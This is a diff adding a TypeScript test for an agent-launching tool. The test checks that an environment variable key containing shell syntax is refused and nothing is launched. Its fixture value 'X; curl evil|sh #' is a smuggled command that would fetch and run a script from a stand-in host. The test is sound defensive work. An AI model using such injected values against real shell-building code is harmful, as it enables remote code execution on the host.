@@ -284,6 +284,21 @@ test("agent:start passes env into the pane command", async () => {
   expect(paneRun?.[3]).toContain("HERD_ID='demo-1' claude");
 });
 
+// buildPaneCommand quotes env values but not keys, so a key that is not a
+// plain identifier would ride into the pane's shell line as syntax.
+test("agent:start refuses an env key that is not a shell identifier and launches nothing", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { "X; curl evil|sh #": "1" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("invalid env key");
+  expect(calls).toEqual([]);
+  const list = await h["agent:list"]({});
+  if (!list.ok) throw new Error("unreachable");
+  expect(list.data.agents).toHaveLength(0);
+});
+
 test("agent:start with herdrSocket builds a runner on that socket", async () => {
   const seenSockets: string[] = [];
   const h = fresh({
